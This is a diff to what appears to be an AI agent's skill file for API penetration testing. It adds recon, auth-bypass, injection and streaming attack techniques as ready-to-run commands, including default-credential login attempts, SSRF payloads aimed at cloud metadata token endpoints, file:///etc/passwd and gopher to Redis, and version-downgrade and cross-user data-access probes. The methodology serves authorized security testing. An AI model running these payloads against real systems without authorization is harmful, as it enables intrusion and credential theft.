@@ -8,7 +8,7 @@ argument-hint: "<command: start|status|resume|next|report>"
 metadata:
   hermes:
     tags: [api, rest, graphql, grpc, pentest]
-    related_skills: [ptest, scode]
+    related_skills: [ptest, scode, ctest, mtest, w3hunt]
 ---
 
 # API-First Penetration Testing Framework
@@ -91,9 +91,47 @@ config:
 
 ---
 
+## API-Type Decision Tree
+
+Your testing priorities shift based on API type. Determine this during initialization:
+
+```
+┌─────────────────────────────────────────────────────────────────────┐
+│ REST API                                                            │
+│ Priority: BOLA/IDOR → Auth bypass → Injection → Mass assignment     │
+│ Phase 1: endpoint enumeration (OpenAPI, fuzzing, JS extraction)     │
+│ Phase 2: systematic endpoint-by-endpoint BOLA testing               │
+│ Phase 3: parameter-level injection on all inputs                    │
+├─────────────────────────────────────────────────────────────────────┤
+│ GraphQL                                                             │
+│ Priority: Introspection → Auth on mutations → Batching/DoS → BOLA  │
+│ Phase 1: introspection query (maps entire schema instantly)         │
+│ Phase 2: test auth on every mutation, field-level access control    │
+│ Phase 3: alias batching, depth attacks, directive abuse             │
+├─────────────────────────────────────────────────────────────────────┤
+│ gRPC                                                                │
+│ Priority: Reflection → Auth per-method → Message manipulation       │
+│ Phase 1: server reflection (maps all services/methods)              │
+│ Phase 2: test auth on each RPC method independently                 │
+│ Phase 3: protobuf field manipulation, type confusion, large msgs   │
+├─────────────────────────────────────────────────────────────────────┤
+│ Mixed (REST + GraphQL + gRPC)                                       │
+│ Priority: GraphQL first (fastest to map), then REST, then gRPC     │
+│ Reason: GraphQL introspection gives you the full schema in one      │
+│ query — use it to understand the data model, then test REST/gRPC   │
+│ endpoints with that knowledge.                                      │
+└─────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
 ## Phase 1: Scope & Recon
 
 ### Gate: endpoints mapped, auth flow documented, API surface understood
+
+**With docs vs without docs:**
+- **With OpenAPI/Swagger/introspection:** Phase 1 takes ~10% of time. Parse the spec, map all endpoints, move quickly to Phase 2. Your job is validation, not discovery.
+- **Without docs (blind):** Phase 1 expands to ~25-30% of time. You need: JS bundle extraction, path fuzzing, error-based parameter discovery, response analysis to infer data models. Invest here — you can't test what you haven't found.
 
 **Techniques:**
 
@@ -131,6 +169,38 @@ config:
    - Check error verbosity (stack traces, internal paths)
    - Document rate limit headers (`X-RateLimit-*`, `Retry-After`)
 
+5. **Error Intelligence:**
+   Extract library/framework info from deliberate malformed requests:
+   ```bash
+   # Type confusion — send wrong types to reveal Go/Java/Python struct info
+   curl -s "$BASE_URL/api/login" -X POST -H "Content-Type: application/json" \
+     -d '{"username":"admin","password":true}'
+   # Look for: "cannot unmarshal bool into Go struct field .password of type string"
+   #           "JsonWebTokenError: jwt malformed"
+   #           "TypeError: expected string, got int"
+
+   # Missing fields — reveals required parameters
+   curl -s "$BASE_URL/api/login" -X POST -H "Content-Type: application/json" -d '{}'
+
+   # Overflow/boundary — reveals validation logic
+   curl -s "$BASE_URL/api/login" -X POST -H "Content-Type: application/json" \
+     -d '{"username":"'$(python3 -c "print('A'*10000)")'"}'
+   ```
+   **What to extract:** JWT library name, language/framework, struct field names, internal error codes, validation rules.
+
+6. **Config/Settings Discovery:**
+   Many API frameworks expose unauthenticated config endpoints:
+   ```bash
+   for path in /api/config /api/v0/config/settings /api/settings /config.json \
+     /actuator/env /actuator/configprops /.well-known/openid-configuration \
+     /api/v1/config /settings /api/info /api/version; do
+     resp=$(curl -s -w "|%{http_code}" "$BASE_URL$path" --max-time 5)
+     code=$(echo "$resp" | rev | cut -d'|' -f1 | rev)
+     [ "$code" != "404" ] && [ "$code" != "000" ] && echo "  $path -> $code"
+   done
+   ```
+   **What to extract:** Auth mechanisms enabled, password policies (MinPasswordLength), feature flags (SelfProvisioning, LoginFormVisible), available backends, version info.
+
 **Reference:** `references/rest-api-patterns.md`, `references/graphql-testing.md`, `references/grpc-testing.md`
 
 ---
@@ -139,7 +209,35 @@ config:
 
 ### Gate: auth bypass tested, BOLA/IDOR tested on all object-referencing endpoints, privilege escalation attempted
 
+**If CDN-fronted and automated scanning fails in Phase 1:** see ptest `vuln-assessment.md` Section 0 (CDN/WAF-Aware Pre-Check) for manual alternatives.
+
 **Techniques:**
+
+0. **Token Acquisition Attempts (before testing bypass):**
+   If no credentials were provided, try to obtain a valid token:
+   ```bash
+   # Default credentials
+   for creds in admin:admin admin:password root:root test:test admin:changeme; do
+     user=$(echo $creds | cut -d: -f1); pass=$(echo $creds | cut -d: -f2)
+     curl -s "$BASE_URL/api/auth/login" -X POST -H "Content-Type: application/json" \
+       -d "{\"username\":\"$user\",\"password\":\"$pass\"}"
+   done
+
+   # Empty/null password (if MinPasswordLength:0 found in config)
+   curl -s "$BASE_URL/api/auth/login" -X POST -H "Content-Type: application/json" \
+     -d '{"username":"admin","password":""}'
+
+   # Registration endpoint (self-signup)
+   for path in /api/auth/register /api/register /api/signup /api/users/create; do
+     curl -s "$BASE_URL$path" -X POST -H "Content-Type: application/json" \
+       -d '{"username":"pentest@test.com","password":"Test1234!","email":"pentest@test.com"}' \
+       -w "\n%{http_code}"
+   done
+
+   # OAuth/OIDC public client flows
+   # Check /.well-known/openid-configuration for token_endpoint
+   ```
+   **Goal:** Get at least one valid token to enable Phase 2 BOLA/IDOR testing.
 
 1. **Authentication Bypass:**
    ```bash
@@ -183,7 +281,26 @@ config:
    - Token exchange abuse
    - Client credential theft
 
-6. **Rate Limiting:**
+6. **Response Diffing (systematic BOLA/data exposure detection):**
+   For every endpoint with object references, compare responses across roles:
+   ```bash
+   # Capture responses for same resource with different auth levels
+   curl -sk -H "Authorization: Bearer $ADMIN_TOKEN" "$BASE_URL/api/users/123" > /tmp/resp_admin.json
+   curl -sk -H "Authorization: Bearer $USER_TOKEN" "$BASE_URL/api/users/123" > /tmp/resp_user.json
+   curl -sk "$BASE_URL/api/users/123" > /tmp/resp_unauth.json
+
+   # Diff field count (data exposure = admin sees more fields)
+   echo "Admin fields: $(jq 'keys | length' /tmp/resp_admin.json)"
+   echo "User fields:  $(jq 'keys | length' /tmp/resp_user.json)"
+   echo "Unauth fields: $(jq 'keys | length' /tmp/resp_unauth.json)"
+
+   # Diff content (BOLA = user A can read user B's data)
+   curl -sk -H "Authorization: Bearer $USER_A_TOKEN" "$BASE_URL/api/users/$USER_B_ID" > /tmp/resp_cross.json
+   [ "$(jq -r '.id' /tmp/resp_cross.json)" = "$USER_B_ID" ] && echo "BOLA CONFIRMED"
+   ```
+   **Pattern:** Run this on every object-referencing endpoint. Fastest way to find BOLA at scale.
+
+7. **Rate Limiting:**
    ```bash
    # Test rate limit enforcement
    for i in $(seq 1 100); do
@@ -209,11 +326,30 @@ config:
 - **JS bundle extraction:** Modern SPAs often embed the full OpenAPI spec in JS bundles. Search for `openapi` in JS filenames: `curl -s https://target/ | grep -oE '/static/js/openapi[^"]+\.js'` — then extract all `url:"..."` patterns. This revealed 494 endpoints on Wallet on Telegram in seconds.
 - Telegram Mini Apps: see ptest `references/telegram-webapp-auth.md` for auth patterns
 
+**CORS Testing (MANDATORY):**
+```bash
+# Origin reflection test
+curl -sk -H "Origin: https://evil.com" -I "$BASE_URL/api/users" | grep -i "access-control"
+# Null origin bypass
+curl -sk -H "Origin: null" -I "$BASE_URL/api/users" | grep -i "access-control"
+# Subdomain wildcard
+curl -sk -H "Origin: https://attacker.target.com" -I "$BASE_URL/api/users" | grep -i "access-control"
+```
+If `Access-Control-Allow-Origin` reflects attacker origin + `Access-Control-Allow-Credentials: true` → High (credential theft via CORS). If reflects but no credentials → Medium (data leakage only).
+
 ---
 
 ## Phase 3: Injection & Logic
 
 ### Gate: injection tested on all input parameters, business logic flaws assessed, race conditions tested where applicable
+
+**Prioritization (limited time? hit these in order):**
+1. **Injection on auth endpoints** — SQLi/NoSQLi on login, registration, password reset (highest impact: auth bypass)
+2. **Mass assignment on user creation/update** — role escalation via extra fields (quick win, high impact)
+3. **Business logic on financial/state-changing operations** — double-spend, negative values, step skipping
+4. **SSRF on URL-accepting parameters** — fetch, webhook, import endpoints (cloud metadata = Critical)
+5. **Race conditions on limited resources** — only if financial/inventory operations exist
+6. **Data exposure on list endpoints** — pagination bypass, over-fetching (usually Medium)
 
 **Techniques:**
 
@@ -240,6 +376,17 @@ config:
 
    # SSRF (in URL parameters)
    curl -sk "$BASE_URL/api/fetch?url=http://169.254.169.254/latest/meta-data/"
+   # AWS IMDSv2
+   curl -sk "$BASE_URL/api/fetch?url=http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
+   # GCP metadata
+   curl -sk "$BASE_URL/api/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+   # Azure metadata
+   curl -sk "$BASE_URL/api/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+   # Internal network scan
+   curl -sk "$BASE_URL/api/fetch?url=http://127.0.0.1:8080/actuator/env"
+   # DNS rebinding / protocol smuggling
+   curl -sk "$BASE_URL/api/fetch?url=file:///etc/passwd"
+   curl -sk "$BASE_URL/api/fetch?url=gopher://127.0.0.1:6379/_INFO"
    ```
 
 3. **GraphQL-Specific:**
@@ -279,7 +426,51 @@ config:
    - Error messages leaking implementation details
    - Pagination bypass (requesting page_size=99999)
 
-7. **gRPC-Specific:**
+7. **API Versioning Exploitation:**
+   ```bash
+   # Discover available versions
+   for v in v0 v1 v2 v3 v4 beta internal legacy; do
+     code=$(curl -sk -o /dev/null -w "%{http_code}" "$BASE_URL/api/$v/users")
+     [ "$code" != "404" ] && echo "  /api/$v/ -> $code"
+   done
+
+   # Compare auth enforcement across versions
+   # Older versions often lack auth checks added later
+   curl -sk "$BASE_URL/api/v1/admin/users"  # 401
+   curl -sk "$BASE_URL/api/v0/admin/users"  # 200? Auth bypass via version downgrade
+
+   # Check for deprecated endpoints still accessible
+   # If OpenAPI spec shows removed endpoints, test them on older version prefixes
+   ```
+   **What to look for:** Auth bypass on older versions, removed-but-accessible admin endpoints, different validation rules (v1 validates input, v0 doesn't).
+
+8. **WebSocket / SSE / Streaming:**
+   ```bash
+   # WebSocket discovery
+   # Check for Upgrade: websocket in responses, or /ws /socket /realtime paths
+   # Common frameworks: Socket.IO (/socket.io/?EIO=4&transport=polling), SignalR (/hub)
+
+   # WebSocket auth bypass
+   # Many WS endpoints check auth only on HTTP upgrade, not on subsequent messages
+   websocat ws://target.com/ws -H "Authorization: Bearer $TOKEN"
+   # After connection: try sending messages without re-authenticating
+
+   # WS message injection (if no per-message auth)
+   echo '{"action":"admin.listUsers"}' | websocat ws://target.com/ws
+
+   # SSE subscription abuse
+   curl -sk -N -H "Authorization: Bearer $USER_TOKEN" "$BASE_URL/api/events/stream"
+   # Check: can you subscribe to other users' event streams?
+   # Check: does the stream leak data from other tenants?
+
+   # Streaming gRPC
+   grpcurl -plaintext -d '{"user_id":"OTHER_USER"}' $HOST:$PORT service/StreamEvents
+   # Server-streaming: can you receive other users' events?
+   # Client-streaming: can you inject messages into other sessions?
+   ```
+   **Key patterns:** Auth checked on connect but not per-message, subscription to other users' channels, event replay (resend old message IDs), no rate limiting on WS messages.
+
+9. **gRPC-Specific:**
    ```bash
    # Message manipulation
    grpcurl -plaintext -d '{"user_id": "OTHER_USER"}' $HOST:$PORT service/GetProfile
@@ -294,6 +485,14 @@ config:
 ---
 
 ## Phase 4: Reporting
+
+### Pre-Report: Chain & Escalate
+
+Before writing the report, revisit all findings and attempt to chain them for higher severity. See ptest `references/chain-and-escalate-phase.md` for the full protocol. Quick checklist:
+- [ ] Can any Info/Low finding be combined with another to escalate impact?
+- [ ] Do error messages reveal info that enables attacks on other endpoints?
+- [ ] Do config leaks (password policy, auth mechanism) make brute-force viable?
+- [ ] Can exposed API docs map authenticated attack surface for future testing?
 
 ### Gate: report delivered with all findings documented and PoCs included
 
